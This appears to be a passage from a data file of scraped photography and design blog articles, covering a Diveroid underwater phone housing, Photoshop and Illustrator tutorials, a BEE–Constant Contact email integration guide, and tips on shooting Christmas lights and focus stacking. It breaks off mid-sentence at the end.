      "text": "Diveroid turns your smartphone into a fully fledged dive camera, computer and logger \nDecember 9, 2019 by John Aldred Leave a Comment \nVIDEO \nThis looks like a pretty cool underwater case if it does what it says on the tin. Or, well, does what it says on the Kickstarter campaign . It\u2019s an underwater enclosure for your smartphone (any smartphone \u2013 so they say) that communicates with your phone over Bluetooth. It even features built-in heating to prevent the insides fogging up. \nIt\u2019s probably a little overkill for just snapping photos of your friends and family in the pool, but if you regularly go diving, it looks pretty handy. The Diveroid app overlays information onto your screen such as your current depth and duration of your current dive. It also lets you know if you\u2019ve hit any safety issues, like critical depth or if you\u2019re ascending too fast when you\u2019re done, and it\u2019ll let you know what to do at your current depth to stay safe. \nWhen it comes to the photo and video side of things, your only limits are the cameras inside your device. There are three universal buttons on the front of the case that you use to control various aspects of the app, including realtime colour correction \u2013 a big problem when you\u2019re at any kind of decent depth. \nThey say it works with \u201cany\u201d smartphone, and have a neat little animation on the campaign showing various devices cycling through their universal underwater housing, although they admit that certain features shown (like the ultra-wide-angle views and such) aren\u2019t going to be available on all devices. If you want to check if your specific device is compatible, though, you can do so here , although this is only based on the physical dimensions of your phone, not software compatibility. \nThe case features double O rings to help with waterproofing. Nothing should get past the first ring, but in the event that a little does leak in, there\u2019ll be so little pressure against the second one that it should hopefully keep your device safe and dry. But, I\u2019d probably test it empty before putting your $1K+ smartphone inside it. \nIf I were the type to dive regularly, this looks pretty interesting, but it would never really see any kind of use. Seems pretty cool, though. But are any of you divers or regular underwater shooters? What do you think of Diveroid? \nTo find out more about Diveroid and check the current pledges and availability, head on over to Kickstarter .",

      "text": "Create a Porcelain Skin Effect in Photoshop \nIn this tutorial we will create a porcelain skin effect using a beautiful portrait of a woman and the power of Photoshop\u2019s blending modes. \nFinal Image \nAs always, this is the final image that we\u2019ll be creating: \nTutorial Details \nProgram : Adobe Photoshop CS3 \nEstimated Completion Time: 30 minutes \nDifficulty: Beginner-Intermediate \nResources \nStep 1 \nOpen file \u201c Girl \u201d. This is our starting photo \u2013 we\u2019ll add a porcelain skin effect to it in the next steps. Select the Crop Tool ( C ) and crop the image so that only the face of the girl is visible as shown below. \nStep 2 \nCreate a new layer ( Ctrl + Shift + Alt + N ) and fill it with white by first pressing D to reset the foreground and background colors to default and by pressing Alt + Backspace . \nChange the blending mode to Soft Light and you should see the effect shown below. This will be our starting point for the porcelain skin effect. \nName this layer \u201c SoftLight \u201d. \nStep 3 \nThe effect is still too low for my taste so let\u2019s increase it by duplicating the \u201c SoftLight \u201d layer (click on the layer in the layers palette and press Ctrl + J ). The effect is a bit too strong now but we can adjust that by simply lowering the opacity of the \u201c SoftLight \u201d layer to 81% . \nStep 4 \nThe skin is starting to look good but the hair and the background look washed out. Not to mention the eyes. Let\u2019s start correcting that by grouping the two \u201cSoftLight\u201d layers \u2013 hold the Shift key and click on each of the two layers in the layer palette to select them. Than press Ctrl + G to group them. Name the group \u201c WhiteEffect \u201d. \nStep 5 \nIn this step we want to keep the skin effect only to the face and disable it for the hair, eyes and background. The best way to do this is with a layer mask. A layer mask is like a regular layer but you can only paint with black and white inside it. Black will hide the layer and white will reveal it. Painting with gray will only partially hide the layer. Let\u2019s try it now. \nClick on the group in the layers palette to make it active and add a layer mask to the group by going to Layer > Layer Mask > Hide All . \nWe notice that the white effect has disappeared completely \u2013 that\u2019s because our layer mask is completely black so it hides it. \nStep 6 \nSelect the standard round soft brush and change the foreground color to white (foreground color is the brush color found just below the tool palette). Click on the layer mask (the little black thumbnail to the right of the group) and start painting with white over the face. \nLower the opacity of the brush to 50% and paint over the shoulders to have the effect applied there too. \nStep 7 \nThe teeth have become a bit yellow after our effect \u2013 let\u2019s correct that. Create a Curves Adjustment Layer ( Layer > New Adjustment Layer > Curves ) and fill the layer mask with black (press D to set the colors to default, click on the layer mask thumbnail in the layers palette and press Ctrl \u2013 Backspace ). Drag the curve up to lighten and go back to the layer mask. With the same round soft brush (just lower the size to 10px ) paint over the teeth to have the whitening effect applied. \nStep 8 \nThe eyes look a bit faded out so let\u2019s adjust that. Create a new Hue/Saturation Adjustment Layer ( Layer > New Adjustment Layer > Hue/Saturation ). Use the settings shown below and change the blending mode of the Hue/Saturation layer to Linear Dodge . You\u2019ll see that the colors in our photo are very intense and don\u2019t look good \u2013 we\u2019ll address that in the next step. \nStep 9 \nClick on the layer mask of the Hue/Saturation Adjustment layer to make it active and fill it with black (press D first, then Ctrl + Backspace ). Select the standard round soft brush and paint with white in the layer mask over the eyes. By doing this we have restricted the effect of the Hue/Saturation layer only to the eyes. \nStep 10 \nThe overall image still looks a bit washed out and light for my taste. Create a Curves Adjustment Layer ( Layer > New Adjustment Layer > Curves ) and drag the left slider to the right in order to both increase the contrast and darken. \nStep 11 \nLet\u2019s sharpen our photo a bit. Create a new layer from all the visible layers by pressing Ctrl + Shift + Alt + E and apply an unsharp effect as shown below ( Filter > Sharpen > Unsharp Mask ). Name this layer \u201cSelective Sharpen\u201d. \nStep 12 \nWe should keep the focus on the girl and not the background so let\u2019s hide some of that sharpen effect. Add a layer mask to the \u201cSelective Sharpen\u201d layer by going to Layer > Layer Mask > Hide All . Click on the layer mask in the layers palette to make it active and paint with white over the face and the eyes to reveal the sharpen effect there. \nStep 13 \nIn order to put some more focus on the face let\u2019s blur the background a bit. Create a new layer from all the visible layers ( Ctrl + Shift + Alt + E ) and apply a 5px Gaussian Blur ( Filter > Blur > Gaussian Blur ). \nAdd a layer mask to this layer just as we did in step 12 and fill it with black (press D then Ctrl + Backspace ). Now paint with white over the background (avoid the face and the hair). \nAnd We\u2019re Done!",

      "text": "This Photoshop tutorial will explain how to create a beautiful frosted-rolled glass inspired text effect, using Photoshop Filters and Layer Styles. \nFinal Image Preview \nResources \nStep 1 \nCreate a new document, 1152\u00d7864 pixels, set the Foreground color to #006d68, and the Background color to #004e49, then, go to Filter -> Render -> Clouds. \nPlace the \u201cfire texture 02\u201d on top of the Background layer, and change its layer\u2019s Blend Mode to Multiply, and its Opacity to 50%. \nPlace the \u201cWeathered Texture\u201d on top of both layers and change its layer\u2019s Blend Mode to Soft Light. \nStep 2 \nCreate the text using the color #7b7b7b. The font used is \u201cAtrox\u201d, and the Size is 330 pt. \nDuplicate the text layer, and change the copy\u2019s Fill value to 0%. \nStep 3 \nDouble click the original text layer to apply the following Layer Style. \n\u2013 Drop Shadow: Just change the color to #686868. \n\u2013 Inner Shadow: Change the color to #737373, the Distance to 0 and the Size to 10. \n\u2013 Bevel and Emboss: Change the Technique to Chisel Hard, the Depth to 150, the Size to 27, and the Soften value to 5. Un-check the Use Global Light box, then, change the Angle to 90, the Altitude to 30, the Gloss Contour to Gaussian, and check the Anti-aliased box. Also, change the Highlight Mode to Overlay, its color to #ded96c, and the Shadow Mode\u2019s color to #7b7b7b. \nThis is what you should get after applying the style above: \nStep 4 \nPress the Ctrl/Cmd key, and click a text layer\u2019s thumbnail (icon) to create a selection. \nCreate a new layer between the two text layers and call it \u201cTexture\u201d. Fill the selection with the color #005954. Then go to Select -> Deselect (or press Ctrl/Cmd + D) to get rid of the selection. \nSet the Foreground color to #006d68 and the Background color to #004e49. \nStep 5 \nIt\u2019s time to apply the Filters to create the texture, so change the values as shown in the images below for each filter. Start by going to Filter- > Texture -> Mosaic Tiles: \nNext, go to Filter -> Artistic -> Dry Brush: \nNow, change the \u201cTexture\u201d layer\u2019s Blend Mode to Hard Light. \nStep 6 \nDouble click the copy (top) text layer to apply the following Layer Style. \n\u2013 Outer Glow: change the Blend Mode to Overlay, and the color to #00a49d. \n\u2013 Inner Glow: Change the Blend Mode to Overlay, the Opacity to 50%, the Noise to 50% as well, the color to 8df4f2, the Technique to Precise, the Source to Center, and the Size to 20. \n\u2013 Bevel and Emboss: Change the Technique to Chisel Hard, the Depth to 150, and the Size to 10. Un-check the Use Global Light box, then, change the Angle to 110, the Altitude to 15, the Gloss Contour to Cove \u2013 Deep, and check the Anti-aliased box. Also, change the Highlight Mode to Vivid Light, and the Shadow Mode\u2019s color to #7b7b7b. \n\u2013 Contour: Choose the Rolling Slope \u2013 Descending contour, and check the Anti-aliased box. \n\u2013 Texture: choose the Metallic Snakeskin Pattern, and change the Depth to 20. \nThis will add a nice glossy effect to the text. \nStep 7 \nRight-click a text layer and choose Create Work Path. \nCreate a new layer right below the original text layer and call it \u201cStroke\u201d, then choose a hard round 7 px brush. \nSet the Foreground color to #159282. Then, pick the Direct Selection Tool, right click the path you\u2019ve just created, and choose Stroke Path. \nChoose Brush from the Tool drop down menu, and make sure that the Simulate Pressure box is unchecked. \nHit Enter/Return to get rid of the path. \nStep 8 \nDouble click the \u201cStroke\u201d layer to apply the following Layer Style: \n\u2013 Drop Shadow: Just change the Size to 2. \n\u2013 Bevel and Emboss: Change the Gloss Contour to Cone \u2013 Inverted and check the Anti-aliased box. Also, change the Highlight Mode to Vivid Light, and the Shadow Mode\u2019s color to #009d9e. \n\u2013 Contour: Choose the Cone \u2013 Inverted contour and check the Anti-aliased box as well. \n\u2013 Texture: Just choose the Clouds Pattern. \nThis is what you should get. \nStep 9 \nCtrl/Cmd + Click a text layer\u2019s thumbnail once again to create a selection, then press Delete to get rid of the inner part of the stroke. . \nWith the text selection still active, create a new layer on top of all layers and call it \u201cSoft Brush\u201d, then change its Blend Mode to Overlay and its Opacity to 50%. Set the Foreground color to #90eadc, and use a soft round brush, with a quite big size (around 100 px) to add some bright dots over some parts of the text. Try not to add too much dots as this will ruin the original effect. \nCreate another new layer on top of all layers and call it \u201cColor Brush\u201d, then change its Blend Mode to Hue and its Opacity to 20%. Set the Foreground color to #eaddd6, and use a little bit bigger soft round brush (around 150 px) to add some color dots. The color is very subtle, but it adds nice depth to the effect. Try not to overdo it as well. \nStep 10 \nNext, we are going to apply the same effect using different colors to a star shape. So pick the Polygon Tool, and make sure that the \u201cShape Layers\u201d icon in the Options bar is clicked, then enter 5 in the \u201cSides\u201d box. \nAlso in the Options bar, under the Polygon Options, check the Star box and set the \u201cIndent Sides By:\u201d value to 50%. Then, set the Foreground color to #7b7b7b. \nCreate the star shape wherever you want to, then duplicate the shape layer and set the copy\u2019s Fill value to 0%. \nStep 11 \nDouble click the original shape layer to apply the following Layer Style: \n\u2013 Drop Shadow: Change the color to #686868, the Distance to 3, and the Size to 3 as well. \n\u2013 Inner Shadow: Change the color to #737373, the Distance to 0 and the Size to 5. \n\u2013 Bevel and Emboss: Change the Technique to Chisel Hard, the Depth to 150, the Size to 14, and the Soften value to 3. Un-check the Use Global Light box, then, change the Angle to 90, the Altitude to 30, the Gloss Contour to Gaussian, and check the Anti-aliased box. Also, change the Highlight Mode to Overlay, its color to #ded96c, and the Shadow Mode\u2019s color to #7b7b7b. \nThis is almost the same Layer Style applied to the original text layer, but using different size values to suit the shape used. So you can modify the values depending on the shape you created and its size compared to the text. \nStep 12 \nNow double click the copy shape layer to apply the following Layer Style: \n\u2013 Outer Glow: Change the Blend Mode to Overlay, the color to #a46000, and the Size to 3. \n\u2013 Inner Glow: Change the Blend Mode to Overlay, the Opacity to 50%, the Noise to 50% as well, the color to #cfad7b, the Technique to Precise, the Source to Center, and the Size to 10. \n\u2013 Bevel and Emboss: Change the Technique to Chisel Hard, and the Depth to 150. Un-check the Use Global Light box, then, change the Angle to 110, the Altitude to 15, the Gloss Contour to Cove \u2013 Deep, and check the Anti-aliased box. Also, change the Highlight Mode to Vivid Light, and the Shadow Mode\u2019s color to #7b7b7b. \n\u2013 Contour: Choose the Rolling Slope \u2013 Descending contour, and check the Anti-aliased box. \n\u2013 Texture: Choose the Metallic Snakeskin Pattern, then change the Scale to 50% and the Depth to 20. \nOnce again, this is similar to the copy text layer\u2019s Layer Styles, but with different size and color values. \nStep 13 \nCreate a new layer on top of the original shape layer, call it \u201cStar Texture\u201d, and change its Blend Mode to Hard Light. Then Ctrl/Cmd + Click the shape\u2019s vector mask thumbnail to create a selection. \nFill the selection with the color #8f7708, then press Ctrl/Cmd + D to get rid of the selection. \nSet the Foreground color to #4e4400 and the Background color to #8f7708. It\u2019s time to apply the Filters to create the texture (like we did in Step 5), so change the values as shown in the images below for each filter. Start by going to Filter- > Texture -> Mosaic Tiles: \nNext, go to Filter -> Artistic -> Dry Brush: \nStep 14 \nCreating the path to add the stroke is a little bit different as this is a shape. You\u2019ll need to pick the Direct Selection Tool, click the star shape itself, then click and drag around the star shape to select its anchor points. After that, go to Edit -> Copy to copy the path \nCreate a new layer below the original shape layer and call it \u201cStar Stroke\u201d, then go to Edit -> Paste to paste the path to the new layer. \nSet the Foreground color to #958938 and choose a hard round 7 px brush. \nPick the Direct Selection Tool again, then stroke the path just like you did before. Right-click the path you\u2019ve just created, and choose Stroke Path. Choose Brush from the Tool drop down menu, and make sure that the Simulate Pressure box is unchecked. Hit Enter/Return to get rid of the path. \nAfter that, Ctrl/Cmd + Click the shape layer\u2019s vector mask thumbnail and press Delete to get rid of the inner parts of the Stroke, and press Ctrl/Cmd + D to get rid of the selection. \nStep 15 \nDouble click the \u201cStar Stroke\u201d layer to apply the following Layer Style: \n\u2013 Drop Shadow: Just change the Size to 2. \n\u2013 Bevel and Emboss: Change the Gloss Contour to Cone \u2013 Inverted and check the Anti-aliased box. Also, change the Highlight Mode to Vivid Light, and the Shadow Mode\u2019s color to #9e8e00. \n\u2013 Contour: Choose the Cone \u2013 Inverted contour and check the Anti-aliased box as well. \n\u2013 Texture: Just choose the Clouds Pattern. \nThis is what you should get. \nFinal Image \nAnd that\u2019s it! You can use other color shades as well if you like, and the effect will look awesome in all colors. \nHope you enjoyed the tutorial and found it useful.",

      "text": "In this Photoshop manipulation tutorial, you will learn you how to create a fantasy winter portrait. \nYou\u2019ll learn how to combine several stock images into a cohesive scene using Photoshop, work with snow, adjust color, create lighting, enhance the depth of field and more. \nFinal Image \nTutorial Details \nProgram : Photoshop CS3+ \nEstimated Completion Time : 90 minutes \nDifficulty : Intermediate \nResources \nStep 1 \nCreate a new 2000\u00d71333 px document in Photoshop and fill it with white. Open the winter image and drag it into the white canvas using the Move Tool (V) . \nStep 2 \nGo to Filter > Blur > Gaussian Blur and set the radius to 11 px : \nThis step is to make the background separate from the model and give some depth to the scene. \nStep 3 \nSelect Layer > New Adjustment Layer > Color Balance and change the Midtones settings: \nStep 4 \nMake a Curves adjustment layer and increase the lightness. On this layer mask, activate the Brush Tool (B) and use a soft black brush to erase the right as we\u2019ve aimed to make the left brighter. \nStep 5 \nCut out the model and place her in the middle of the canvas. \nStep 6 \nMake a Hue/Saturation adjustment layer and set it as Clipping Mask . Reduce the Saturation value to -25 . \nStep 7 \nAdd a Color Balance adjustment layer and change the Midtones settings. \nStep 8 \nCreate a Curves adjustment layer to brighten the model more. On the layer mask, use a soft black brush to erase the white skirt so it won\u2019t be too bright. \nStep 9 \nMake a new layer and use a soft brush with the color #b56989 to paint on the model lips so they look more vibrance. Alter this layer mode to Soft Light 60% . \nStep 10 \nOpen the horns image and isolate them from the background. Use the Lasso Tool (L) to grab the left part and place it in the left of the model\u2019s head. \nAdd a mask to this layer and use a medium-soft black brush to erase the part on the model\u2019s face and blend the rest with her head. \nStep 11 \nAdd another horn part to the right of the model\u2019s head using the same method. \nStep 12 \nSelect the horn layers and press Ctrl+G to make a group for them. Change this layer mode to Normal 100% and use a Hue/Saturation adjustment layer to desaturate the horns\u2019 color . \nStep 13 \nAdd a Color Balance adjustment layer to match the horns\u2019 color with the scene. \nStep 14 \nCreate a Curves adjustment layer to bring more light to the horns, especially their right side. On the layer mask, paint on their left side so they won\u2019t be affected or be less affected by this adjustment layer. \nStep 15 \nOn each of the horn layers, make a new layer, change the mode to Overlay 100% and fill with 50% gray. \nSelect the Dodge and Burn Tool (O) with Midtones Range , Exposure about 10-15% to refine the light and shadow on the horns. You can see how I did it with Normal mode and the result with Overlay mode. \nStep 16 \nOpen the branches image and cut out them using your own method. Select the branches on the right and add them to the left side of our main canvas. Flip it horizontally by choosing Edit > Transform > Flip Horizontal : \nStep 17 \nDuplicate this layer and move it to the right after flipping it horizontaly. Select other parts of the branches from the original image to add to the lower of the front. \nStep 18 \nApply a Gaussian Blur of 4 px to each of the branches layers to increase the depth of field. \nStep 19 \nCreate a group for the branches layers and add a Hue/Saturation adjustment layer to desaturate the branches. \nStep 20 \nUse a Color Balance adjustment layer to change the branches\u2019 color. \nStep 21 \nMake a Curves adjustment layer to brighten the branches. Paint on the shadow side of the branches on the left so it won\u2019t be affected by this adjustment layer. \nStep 22 \nCreate a new layer on top of the layers and change the brush to the snow ones. Select a brush you like with the color #e6ebf2 to spot on the canvas. \nAdd a mask to this layer and use a soft black brush to reduce the snow opacity and intensity. \nStep 23 \nPaint with another snow brush on a new layer using the same color. \nApply a Motion Blur with the following settings to this snow layer. \nStep 24 \nUse a layer mask to reduce the snow visibility on the model. \nStep 25 \nCreate a Gradient Map adjustment layer on top of the layers and pick the colors #e13a00 and #00601b . Lower the opacity of this layer to 20% . \nStep 26 \nAdd a Color Balance and alter the Midtones values: \nStep 27 \nMake two Photo Filter adjustment layers and pick the colors #0075ec and #00b7ec . \nStep 28 \nCreate a Curves adjustment layer to bring more light to the whole scene. \nStep 29 \nMake a Color Fill layer and select the color #c5a3a1 . Lower the opacity of this layer to 20% and use a soft black brush to erase the dreamy effect on the model, leave it visible on the background. \nStep 30 \nCreate a new layer and use a soft brush with the color #230202 to paint on the both sides of the scene. Change this layer mode to Linear Dodge 100% . \nStep 31 \nMake a new layer and use a soft brush with the color #f4b2ad to paint highlight for the left, model and branches. Alter this layer mode to Overlay 100% . \nAnd We\u2019re Done! \nI hope that you enjoyed this tutorial.",

Open the sky image and use the Rectangular Marquee Tool (M) to select the sky only and move it into the white canvas using the Move Tool (M) . Place it in the upper half. \nStep 2 \nGo to Layer > New Adjustment Layer > Color Balance and set it as Clipping Mask . Change the Midtones settings. \nStep 3 \nBrowse the landscape image and place it in the lower half of the canvas. \nClick the second icon at the bottom of the Layers panel to add a mask to this layer. Use a soft black brush to remove the sky and make the landscape blended with the existing sky. \nStep 4 \nCreate a Photo Filter adjustment layer and pick the color #e64bc3 . \nStep 5 \nMake a Curves adjustment layer to brighten the landscape. On this layer mask, use a soft black brush with the opacity about 10-15% to erase the foreground as we\u2019ve aimed to make this area a bit darker than the rest. \nStep 6 \nAdd a Color Balance adjustment layer to match the landscape\u2019s color with the sky. \nStep 7 \nPlace the city image in the upper section of the main canvas and flip it vertically ( Edit > Transform > Flip Vertical) . \nAdd a mask to this layer to erase most of the sky . \nStep 8 \nCreate a Color Balance adjustment layer to change the city\u2019s color. \nStep 9 \nMake a Curves adjustment layer to darken the left of the city. On the layer mask, paint on the right so it won\u2019t be affected by this adjustment layer. \nStep 10 \nCreate another Curves adjustment layer to brighten the right (light\u2019s area) a bit. Paint on the left so it won\u2019t be brightened by this adjustment layer. \nStep 11 \nOpen the man image and isolate him from the background. Place him in the middle section of the field and use a layer mask to blend the bottom of the bench with the field. \nStep 12 \nTo make the shadow for the man and the bench , make a a new layer below the man one. Hold down the Ctrl and click the thumbnail of the man layer to load his selection. \nFill this selection with the color #100b0f . Lower the opacity of this layer to 50% and flip it vertically. Use Ctrl+T to rotate this shadow to fit the light source from the sky. \nStep 13 \nGo to Filter > Blur > Gaussian Blur and set the radius to 4 px to soften the shadow. Add a mask to this layer and use a soft black brush to reduce the shadow\u2019s opacity on the top and bottom as shown below. \nStep 14 \nCreate a new layer above the man one and set it as Clipping Mask . Use the Clone Tool (S) to remove the blades on the man\u2019s back. \nStep 15 \nMake a Color Balance adjustment layer and alter the Midtones settings: \nStep 16 \nCreate a Curves adjustment layer to brighten the man and the bench. Paint on the back/hidden areas so they won\u2019t be affected by this adjustment layer. \nAdd another Curves adjustment layer to dark the back side of the bench. The selected areas show where to paint on the layer mask. \nStep 17 \nMake a new layer on top of the layers and change the brush to the bird ones. Use different brushes with the color #69064a to paint birds along the space between the landscape and the city. \nStep 18 \nCreate a Color Balance adjustment layer on top of the layers and change the Midtones and Highlights values. \nStep 19 \nAdd another Color Balance adjustment layer to enhance the color of the whole scene. \nStep 20 \nUse a Curves adjustment layer to darken the left side of the canvas.

      "text": "Constant Contact is a popular email service provider, and for good reason: It\u2019s a powerful tool that can be used to automate and send your emails. And now, you can create stunning emails using the BEE editor and then export them to Constant Contact. Here\u2019s your guide to how to integrate Constant Contact with your BEE account. \nWhy Constant Contact? \nConstant Contact is an email service provider that has several benefits for marketers. The platform makes it easy to send emails and track how they\u2019re performing. And Constant Contact pricing is also affordable, with a basic plan starting at just $20 per month. \nThe BEE email editor is another great tool for any business. Simple to use, BEE can help you create beautiful, personalized emails that are ready to go out to your list in a matter of minutes, helping you save time and win more conversions . Now, BEE has rolled out a Constant Contact connector so you can export your BEE emails into Constant Contact, and get the best of both worlds! \nBe aware that the Constant Contact connector is only available for BEE team and agency members \u2014 so if you have a free account with BEE, you\u2019ll need to upgrade to take full advantage. Click here to start your free two-week trial (no credit card required). If your account is already good to go, let\u2019s get into how to integrate Constant Contact with BEE. \nHow to Integrate Constant Contact: Method #1 \nThere are two methods of connecting the Constant Contact service with BEE. Here\u2019s method #1. \nStep #1: Go to Settings \nFrom your BEE dashboard, navigate to \u201cSettings\u201d and then click \u201cConnectors.\u201d Scroll through the list of options until you see Constant Contact. Click the purple \u201cConnect\u201d button next to the Constant Contact service. \nStep #2: Log in to Constant Contact \nWhen you click \u201cConnect,\u201d you\u2019ll see a pop-up that asks you to connect your Constant Contact account. One of two things will happen next: You may see an additional pop-up that asks if you\u2019ll allow the BEE Connector permission to read your account data (in which case, your Constant Contact account will connect automatically). If not, you\u2019ll see a pop-up in which you have to manually type in your Constant Contact username and password. Either way, you\u2019re in! \nPro tip: If you design emails for multiple clients, look into getting a BEE Pro Agency subscription . With this type of subscription, you can connect to multiple Constant Contact accounts and manage them separately, making it easy to switch between different accounts. \nMethod #2 \nThere\u2019s one more method you can use to jumpstart your Constant Contact export campaigns. Here\u2019s how. \nStep #1: Export message \nIf you\u2019re working on an email inside the BEE editor, you\u2019ll see a purple \u201cExport message\u201d button on the Message Details page when it\u2019s done. Click that button and then choose \u201cExport to another application\u201d from the pop-up. \nStep #2: Select a verified email \nChoose Constant Contact from the list of options and, if you haven\u2019t already logged in under Settings, follow the steps to log into your Constant Contact account. Next, choose one of the \u201cVerified Emails\u201d from your Constant Contact account. You can set that email as the \u201csender/reply email\u201d for your campaign. (If you choose the wrong one, don\u2019t worry \u2014 you can tweak this later from within Constant Contact.) And that\u2019s it! \nWrap-Up: Constant Contact Integration \nNow that your accounts are connected, you can create email templates within the BEE editor and then export those templates to Constant Contact, enjoying the benefits of both platforms as you send emails to your list. Sign up for a free trial of BEE Pro if you need it and start designing today! \nThe post How To Integrate Constant Contact With the BEE Email Editor appeared first on Email Design .",

      "text": "Welcome back to another Illustrator based tutorial, in which we\u2019re going to learn how to create a flat lock icon, using nothing more than a couple of basic geometric shapes. \nSo, assuming you already have the software up and running, let\u2019s jump straight into it! \nTutorial Details: Lock Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2019 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 15 Minutes \nFinal Image: Lock Icon \nStep 1 \nAs with every new project, we\u2019re going to kick things off by setting up a New Document , by heading over to File > New (or by using the Control-N keyboard shortcut), which we will then adjust as follows: \nNumber of Artboards: 1 \nWidth: 96 px \nHeight: 96 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard \u2019s Size ( Width x Height ). \nStep 2 \nOnce we\u2019ve finished setting up our project file, we can start working on the actual icon by creating its background using an 88 x 88 px circle, which we will color using #8E73FF and then position to the center of the underlying Artboard using the Align panel\u2019s Horizontal and Vertical Align Center options. \nStep 3 \nAdd the shackle using a 16 x 24 px rounded rectangle with an 8 px Corner Radius , which we will center align to the background, positioning it at a distance of 22 px from its top anchor point . \nStep 4 \nTurn the shape that we\u2019ve just created into an outline by first flipping its Fill with its Stroke using the Shift-X keyboard shortcut, making sure to open up the Stroke panel afterwards and set its Weight to 4 px . \nStep 5 \nCreate a 40 x 40 px circle, which we will color using #8E73FF and then position as seen in the reference image in order to use it as a separation surface. \nStep 6 \nAdd the lock\u2019s main body using a smaller 32 x 32 px circle, which we will color using white ( #FFFFFF ) and then center align to the separation surface. \nStep 7 \nCreate the head section of the keyhole using an 8 x 8 px circle, which we will color using #8E73FF and then position at a distance of 9 px from the larger body\u2019s upper anchor point . \nStep 8 \nAdd the hole\u2019s lower body using a 2 x 10 px rectangle ( #8E73FF ) which we will position onto the lower half of the previous shape. \nStep 9 \nAdjust the shape that we\u2019ve just created by individually selecting each of its bottom anchor points using the Direct Selection Tool (A) , and then horizontally pushing them to the outside by a distance of 2 px using the directional arrow keys. Once you\u2019re done, make sure you select the resulting shape and the upper circle and group them together using the Control-G keyboard shortcut. \nStep 10 \nFinish off the icon and with it the project itself, by giving the shapes that we\u2019ve just grouped an outline using the Stroke method, by creating a copy ( Control-C ) of them, which we will paste in front ( Control-F ) and then adjust by first flipping their Fill with their Stroke ( Shift-X ) and then setting their Weight to 2 px and their Corner to Round Join . Take your time, and once you\u2019re done make sure you select and group ( Control-G ) all of the keyhole\u2019s composing shapes doing the same for the entire icon afterwards. \nGreat Job! \nAs always, I hope you had fun working on the project and most importantly managed to learn something new and useful during the process. \nThat being said, if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nThe post How to Create a Lock in Adobe Illustrator appeared first on Vectips .",

      "title": "How to Photograph Christmas Light Displays",
      "text": "It\u2019s the most wonderful time of the year! Streets are filled with joyful songs and gorgeous light displays. Some Christmas trees and illuminations are so large that photographing them can be tricky. Next are some tips and composition ideas, with examples, that can help you take better photos this holiday season. \nGenerally speaking, aim to photograph during blue hour \u2014 the hour before sunrise and after sunset \u2014 because the contrast between the bright lights and the sky won\u2019t be as strong. If you don\u2019t get all your shots during those hours don\u2019t worry. In fact, the majority of the photos showcased in this post were taken with a pitch-black sky. \nYou will be shooting during the evening and at night, so carry a tripod with you. Shoot wide \u2014 get a wide-angle lens (lower than 35mm) \u2014 to get as much of the scene as possible. Set your camera to manual mode and select the RAW image format to be able to recover highlights and shadows in post-processing. \nLines all the way! Composition is key. You might have a beautiful scene but if you don\u2019t know how to present it to the viewer even the most beautiful details can be lost in the photo. If you are photographing a tree, don\u2019t just take a photo of the tree, add a foreground that leads toward it. \nThe most common way to lead the viewer\u2019s eyes is through lines. It\u2019s important to take some time to look around and find those lines. You would be surprised how common they are, you can find them in places like escalators and on the ground. \nFast track! If you don\u2019t find lines that work with your composition, try to create them with light trails. Make a long exposure of cars and buses, or other light sources passing by. Your camera needs to be still, so a tripod is a requirement for this technique. \nBy rule, a light trail can be captured by using the lowest ISO, a small aperture (high f-stop number), and by leaving the shutter speed open for a few seconds. Experiment with different times to find out which exposure gives you the best result. The challenge is not to over-expose the light trails. Check on your viewfinder and histogram if the highlights are not blown out. \nCurves? Yes, please! In addition to lines make sure to look for curves. They are even more dynamic! The type of curves that are most popular in photography are the C and S curves. You can find them in nature (ex: rivers and hills) and on the streets of most cities. \nCrowds are welcome! During Christmas time, some cities, like London, can be quite crowded with tourists. If you can\u2019t escape the crowds you can deliberately add people to your composition to give the viewer a sense of perspective. It\u2019s a great way to display how magnificent and large some light displays are. Blur the people with a long exposure to show the movement and energy of the place or go for a still shot like the one with a silhouette. \nDouble the scene! Use reflections to do more creative work. Reflections can double your subject, add texture and balance your photo with symmetry. Water is often used in reflection photography. In addition to natural pools, like lakes and rivers, puddles are also popular, especially in cities. \nTake a walk after a downpour and scout for puddles. To photograph them, make sure to position your camera and tripod very close to the ground. You can also find other reflecting opportunities in buildings with glass and steel surfaces, wet pavements and even cars, as you can see in the examples below. \nRemember to look down! Try to find rooftops and balconies available to the public in the area. Shooting from a high vantage point with a wide lens is a great way to capture the colorful avenues and wooden chalets of Christmas markets. Higher angles can also be used to get more than one Christmas display in the same frame. \nI hope that this was informative. I would like to wish you a wonderful holiday season with many photo opportunities ahead. \nAbout the author : Mara Leite is a globetrotting photographer capturing the vibrant colors of the world through landscapes and cityscapes.

      "title": "Beginner\u2019s Guide to Focus Stacking for Macro Photography",
      "text": "One of the greatest challenges in macro photography is the depth of field, or DOF for short. Not only does the zone of sharpness drastically fall off as we get closer to our subjects, other factors such as the lack of light and diffraction softening make it tricky to use narrow apertures on top of that. \nAt a magnification ratio of 1:1, it is already impossible to get the entire scene in focus unless you are photographing your stamp collection, and it only gets worse as we increase the magnification ratio. \nThe DOF-Challenge and Its Solution \nThe reason for that is, as mentioned above, the very nature of optics: the closer a subject is to the lens, the shallower the depth of field is going to be. This can be counteracted by a narrow aperture, which cancels out a large portion of the light cone in order to decrease the fall-off in sharpness. \nBut this only works to a certain degree. If the aperture opening becomes too narrow, light waves begin to bend and soften the image. This phenomenon is called diffraction . Luckily, there is a technique called Focus Stacking, that allows us to work around this challenge by combining multiple images. \nFocus Stacking \nAs the name suggests, focus stacking is a technique where you take multiple photos of the same subject, but at slightly different focusing distances, and \u201cstack\u201d them. When we merge these images in post processing, we produce one overall sharp image where the whole frame is in focus. Many landscape photographers like using this method to get both their foreground and far background in focus, but it\u2019s especially useful for macro photography. \nThe basic idea is to mount your camera on a tripod, compose the shot, and then take a sequence of images while slightly shifting focus between shots. \nWhen it comes to performing a focus stack there are quite a few ways to do it, so let\u2019s have a look! \nOption 1: Manually shifting focus \nThis works best in live-view at full zoom or with focus peaking enabled. The advantage of this technique is that you won\u2019t need any additional equipment besides your camera and a tripod, so this is perfect if you are just starting out and want to get a feel for it. \nThe downside of this technique is 